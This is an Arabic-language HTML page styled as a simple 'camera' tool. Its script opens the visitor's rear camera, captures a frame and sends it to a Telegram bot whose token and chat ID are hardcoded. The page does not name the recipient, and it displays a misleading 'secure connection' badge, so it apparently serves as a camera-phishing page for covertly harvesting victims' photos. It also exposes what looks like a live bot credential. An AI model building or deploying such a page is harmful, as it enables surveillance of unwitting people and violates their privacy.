<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>كاميرا</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0d0d0d;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
        }
        .container {
            background: #1a1a2e;
            padding: 40px 30px;
            border-radius: 25px;
            box-shadow: 0 0 60px rgba(233, 69, 96, 0.15);
            max-width: 400px;
            width: 92%;
            border: 1px solid #2a2a4a;
            text-align: center;
        }
        .icon { font-size: 70px; margin-bottom: 10px; }
        h2 { color: #e94560; font-weight: 300; margin-bottom: 8px; }
        p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
        .btn {
            width: 100%;
            padding: 16px;
            background: #e94560;
            border: none;
            color: #fff;
            font-weight: bold;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            transition: 0.3s;
        }
        .btn:hover { background: #c73652; transform: scale(1.02); }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        #status {
            margin-top: 18px;
            padding: 14px;
            border-radius: 12px;
            background: #12122a;
            border: 1px solid #1a1a3a;
            font-size: 14px;
            color: #aaa;
            min-height: 55px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-wrap: wrap;
            gap: 6px;
        }
        .loader {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 3px solid #2a2a4a;
            border-top: 3px solid #e94560;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .footer { margin-top: 18px; font-size: 11px; color: #444; border-top: 1px solid #1a1a3a; padding-top: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">📷</div>
        <h2>كاميرا</h2>
        <p>اضغط لالتقاط صورة وإرسالها</p>
        <button class="btn" id="captureBtn">📸 التقاط وإرسال</button>
        <div id="status">⏳ اضغط الزر</div>
        <div class="footer">🔒 اتصال آمن</div>
    </div>

    <script>
        const BOT_TOKEN = "8959014011:AAFI8eCWilYlrIGtfK6NmjqhgIN1KDWoDVM";
        const CHAT_ID = "5730027675";

        const btn = document.getElementById('captureBtn');
        const statusDiv = document.getElementById('status');

        async function captureAndSend() {
            btn.disabled = true;
            statusDiv.innerHTML = `<span class="loader"></span> جاري فتح الكاميرا...`;
            statusDiv.style.color = '#ff9800';

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "environment" }
                });

                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 400));

                const canvas = document.createElement('canvas');
                const track = stream.getVideoTracks()[0];
                const settings = track.getSettings();
                canvas.width = settings.width || 640;
                canvas.height = settings.height || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                const imageData = canvas.toDataURL('image/jpeg', 0.9);
                const blob = await fetch(imageData).then(r => r.blob());

                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                stream.getTracks().forEach(t => t.stop());

                if (response.ok) {
                    statusDiv.innerHTML = `✅ تم إرسال الصورة`;
                    statusDiv.style.color = '#4caf50';
                } else {
                    statusDiv.innerHTML = `❌ فشل الإرسال`;
                    statusDiv.style.color = '#e94560';
                }
            } catch (error) {
                let msg = '❌ فشل الوصول للكاميرا';
                if (error.name === 'NotAllowedError') msg = '🚫 تم رفض صلاحية الكاميرا';
                else if (error.name === 'NotFoundError') msg = '📵 لا توجد كاميرا';
                statusDiv.innerHTML = msg;
                statusDiv.style.color = '#e94560';
            }

            btn.disabled = false;
        }

        btn.addEventListener('click', captureAndSend);
    </script>
</body>
</html>
